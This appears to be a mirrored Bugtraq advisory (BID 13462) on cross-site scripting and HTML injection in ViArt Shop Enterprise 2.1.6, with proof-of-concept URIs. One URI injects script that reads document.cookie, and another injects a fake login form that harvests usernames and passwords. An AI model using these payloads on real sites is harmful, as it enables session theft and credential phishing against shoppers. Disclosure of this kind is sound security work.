@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid13462<p><b><span style="font-size: 18pt;">CodeToSell ViArt Shop Enterprise Multiple Cross-Site Scripting and HTML Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13462/info">info</a><br><a href="http://www.securityfocus.com/bid/13462/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13462/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13462/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13462/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				13462
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 02 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 02 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Lostmon &lt;lostmon@gmail.com&gt; is credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					CodetoSell ViArt Shop Enterprise 2.1.6 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					CodetoSell ViArt Shop Enterprise 2.1.8 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following proof of concept URI are available:<br/>http://www.example.com/basket.php?rp=products.php%3Fcategory_id%3D0XSS-CODE%26search_string%3Dss%26search_category_id%3D<br/>http://www.example.com/basket.php?rp=products.php%3Fcategory_id%3D0%26search_string%3DXSS-CODE%26search_string%3Dss%26search_category_id%3D%26search_category_id%3D<br/>http://www.example.com/basket.php?rp=products.php%3Fcategory_id%3D0%26search_string%3Dss%26search_string%3Dss%26search_category_idXSS-CODE%26search_category_id%3D<br/>http://www.example.com/basket.php?rp=products.php%3Fcategory_id%3D0%26search_string%3Dss%26search_string%3Dss%26search_category_id%3DXSS-CODE%26search_category_id%3D<br/>http://www.example.com/basket.php?rp=products.php%3Fcategory_id%3D0%26search_string%3Dss%26search_string%3Dss%26search_category_id%3D%26search_category_id%3DXSS-CODE<br/>http://www.example.com/page.php?page=about%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/page.php?page=%3Cp%3Ean%20eror%20was%20send%20to%20webmaster,%20please%20insert%20your%20username%20and%20password%20,%20and%20continue%20shopping%20%3Cform%20action=%22http://www.example.com/save.php%22%20method=%22post%22%3EUsername:%3Cinput%20aame=%22username%22%20type=%22text%22%20maxlength=%2230%22%3E%3Cbr%3EPassword:%3Cinput%20name=%22password%22%20type=%22text%22%20maxlength=%2230%22%3E%3Cbr%3E%3Cinput%20name=%22login%22%20type=%22submit%22%20value=%22Login%22%3E%3C/form%3E<br/>http://www.example.com/reviews.php?category_id=0&amp;item_id=4XSS-CODE<br/>http://www.example.com/reviews.php?category_id=0XSS-CODE&amp;item_id=4<br/>http://www.example.com/reviews.php?filter=0&amp;item_id=4XSS-CODE&amp;category_id=0<br/>http://www.example.com/product_details.php?item_id=4&amp;category_id=0XSS-CODE<br/>http://www.example.com/products.php?category_id=13XSS-CODE<br/>http://www.example.com/products.php?category_id=0&amp;search_string=XSS-CODE&amp;search_category_id=<br/>http://www.example.com/news_view.php?news_id=3&amp;rp=news.phpXSS-CODE&amp;page=1<br/>http://www.example.com/news_view.php?news_id=3&amp;rp=news.php&amp;page=1XSS-CODE
+	
+		<ul>
+</ul>
+</div>
